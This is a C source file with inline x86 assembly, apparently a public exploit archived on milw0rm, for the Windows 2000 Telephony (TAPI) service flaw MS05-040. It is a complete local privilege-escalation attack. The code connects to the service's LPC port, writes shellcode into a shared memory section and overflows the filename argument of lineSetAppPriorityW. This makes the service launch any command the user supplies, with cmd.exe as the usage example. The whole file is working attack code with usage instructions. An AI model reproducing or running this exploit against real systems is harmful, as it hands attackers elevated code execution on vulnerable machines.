// by Cesar Cerrudo - Argeniss - www.argeniss.com
// 
// TAPI Vulnerability- MS05-040
//
// Should work on Win2k sp0,sp1,sp2,sp3,sp4 any language
// If Telephony Service is not running you can start it by net start "Telephony Service"

#include "windows.h"
#include "stdio.h"
#include "tapi.h"

typedef struct _UNICODE_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING;


typedef struct LpcSectionMapInfo{
        DWORD Length;
        DWORD SectionSize;
        DWORD ServerBaseAddress;
} LPCSECTIONMAPINFO;


typedef struct LpcSectionInfo {
        DWORD Length;
        HANDLE SectionHandle;
        DWORD Param1;
        DWORD SectionSize;
        DWORD ClientBaseAddress;
        DWORD ServerBaseAddress;
} LPCSECTIONINFO;

#define SHARED_SECTION_SIZE 0x1000

typedef struct _OBJDIR_INFORMATION {
  UNICODE_STRING          ObjectName;
  UNICODE_STRING          ObjectTypeName;
  BYTE                    Data[1];
} OBJDIR_INFORMATION;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING *ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        
    PVOID SecurityQualityOfService;  
} OBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

WCHAR  * uString=(WCHAR  *) HeapAlloc(GetProcessHeap(), 0, 0x100);
LPVOID lpLocalAddress,lpTargetAddress;


DWORD ConnectToLPCPort(){

	HMODULE hNtdll;	
	HANDLE hPort;
	LPCSECTIONINFO sectionInfo;
	LPCSECTIONMAPINFO mapInfo;
	byte ConnectDataBuffer[100];
	DWORD Size = sizeof(ConnectDataBuffer);
	WCHAR  * uString=L"\\RPC Control\\tapsrvlpc";//TAPI LPC port
	DWORD i;
	UNICODE_STRING uStr;

	for (i=0;i<100;i++)
		ConnectDataBuffer[i]=0x0;


	hNtdll=LoadLibrary("ntdll.dll");

	DWORD (WINAPI * pfnNtConnectPort)(HANDLE*,UNICODE_STRING * ,SECURITY_QUALITY_OF_SERVICE*,DWORD*,DWORD*,DWORD*,DWORD*,DWORD*);
	pfnNtConnectPort= (DWORD (WINAPI *)(HANDLE* ,UNICODE_STRING *,SECURITY_QUALITY_OF_SERVICE*,DWORD*,DWORD*,DWORD*,DWORD*,DWORD*))GetProcAddress(hNtdll,"NtConnectPort");

	DWORD (WINAPI * pfnCreateSection)(HANDLE* ,DWORD,DWORD,PLARGE_INTEGER,DWORD,DWORD,DWORD);
    pfnCreateSection= (DWORD (WINAPI *)(HANDLE* ,DWORD,DWORD,PLARGE_INTEGER,DWORD,DWORD,DWORD))GetProcAddress(hNtdll,"NtCreateSection");

	HANDLE hSection;
	LARGE_INTEGER SecSize;
	DWORD maxSize=0;
	
	SecSize.LowPart=0x1000;
	SecSize.HighPart=0x0;

	SECURITY_QUALITY_OF_SERVICE qos;
    DWORD qosSize=4;
	qos.Length =(DWORD)&qosSize;
	qos.ImpersonationLevel =(_SECURITY_IMPERSONATION_LEVEL)0x2;
	qos.ContextTrackingMode =0x01000101;
	qos.EffectiveOnly =0x10000;
	
	//create shared section
	pfnCreateSection(&hSection,SECTION_ALL_ACCESS,NULL,&SecSize,PAGE_READWRITE,SEC_COMMIT ,NULL);

	memset(&sectionInfo, 0, sizeof(sectionInfo));
	memset(&mapInfo, 0, sizeof(mapInfo));

	sectionInfo.Length = 0x18;
	sectionInfo.SectionHandle =hSection;
	sectionInfo.SectionSize = SHARED_SECTION_SIZE;
	mapInfo.Length = 0x0C;

	uStr.Length = wcslen(uString)*2;
	uStr.MaximumLength = wcslen(uString)*2+2;
	uStr.Buffer =uString;
	
	//connect to LPC port
	if (!pfnNtConnectPort(&hPort,&uStr,&qos,(DWORD *)&sectionInfo,(DWORD *)&mapInfo,&maxSize,(DWORD*)ConnectDataBuffer,&Size)){
		lpLocalAddress =(LPVOID)sectionInfo.ClientBaseAddress ; 
		lpTargetAddress =(LPVOID)sectionInfo.ServerBaseAddress ;
		return 1;
	}

	return 0;
}

 
int main(int argc, char* argv[])
{

  HMODULE hKernel;
  DWORD iStrLen;
  FARPROC pWinExec,pExitThread;
  LPSTR sCommand;


  if (!argv[1]) {
	printf("\nUsage :\n	TapiExploit \"command\" \n");
	printf("\nExample :\n  TapiExploit \"cmd.exe\" \n");
	exit(0);
  }
    
  iStrLen=strlen(argv[1]);

  if(iStrLen>=65){
	printf("\n\"command\" must be less than 65 chars.\n");
	exit(0);
  }

  sCommand=argv[1];

  if (!ConnectToLPCPort()){ //connect to TAPI LPC port 
	printf("Could not connect to LPC port \nTAPI service couldn't be running\nTry again."); 
	exit(0);
  }


  hKernel=LoadLibrary("Kernel32.dll");
	
//  pWinExec=GetProcAddress(hKernel,"WinExec");
  pWinExec=GetProcAddress(hKernel,"CreateProcessA");
  pExitThread=GetProcAddress(hKernel,"ExitThread");

CHAR sWinSta[]="WinSta0\\Default";

	//copy shellcode
_asm {

	pushad

	lea esi, Shellcode
	mov edi, lpLocalAddress  
	add edi, 0x10
	lea ecx, End
	sub ecx, esi
	push esi
	push edi
	cld
	rep movsb

	pop edi
	pop esi
	push edi

	lea ecx, CommandBuf
	sub ecx, esi
	add edi, ecx
	mov esi, sCommand
	mov ecx, iStrLen
	rep movsb
	mov [edi], 0x00

	pop edi
	mov esi, pWinExec
	mov [edi+0x0a], esi

	mov esi, pExitThread
	mov [edi+0x0e], esi


//////////////

	add edi, 0x2f0
	lea esi, sWinSta
	mov ecx, 0xf
	cld
	rep movsb


///////////////


	jmp Done

Shellcode:
    jmp Start
				// this gets overwritten
	mov ax,0xffff
	mov ax,0xffff
	mov ax,0xffff	
	mov ax,0xffff	

CommandBuf:					// this gets overwritten
	mov dword ptr[eax],0x55555555
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	
	mov dword ptr[eax],0x55555555	

Start:
	call getDelta

getDelta:
	pop edx							// Get shellcode/shared section pointer
	push edx						

/*	push 0x1						// push 0x0 for hidden window
	lea eax, [edx-0x47]					
	push eax						// Command offset
	call [edx-0x4f]					// Call WinExec
 */
 
	mov eax, edx
	add eax,0x500

	push eax					//LPPROCESS_INFORMATION

	add eax, 0x100
	mov ebx, edx
	xor bl, bl
	lea ecx, [ebx+0x300]
	lea ebx, [eax+0x8]	
	mov [ebx], ecx				//set windows station and desktop
	push eax					//LPSTARTUPINFO
	push 0x0
	push 0x0
	push 0x0
	push 0x0
	push 0x0
	push 0x0
	
	lea eax, [edx-0x47]					
	push eax						// Command offset

	push 0x0
	call [edx-0x4f]					// Call create process



	pop edx
	call [edx-0x4b]					// Call ExitThread

End:

Done:
	popad

  }


  LPSTR   lpszAppFilename=(LPSTR  )HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x21C) ;    
  LINEEXTENSIONID ExtensionID;

  memset(lpszAppFilename,0x58,0x21A);

  _asm{
	pushad

	mov ebx, lpszAppFilename
	lea ebx, [ebx+0x216]
	mov eax, lpTargetAddress
	add eax, 0x10
	mov [ebx], eax

	popad
  }

  lineSetAppPriorityW((LPWSTR )lpszAppFilename,NULL,&ExtensionID,LINEREQUESTMODE_MAKECALL,NULL,NULL);

  Sleep(1000);

  printf("Command should have been executed ;)\n"); 

  return 0;

}

// milw0rm.com [2006-03-14]
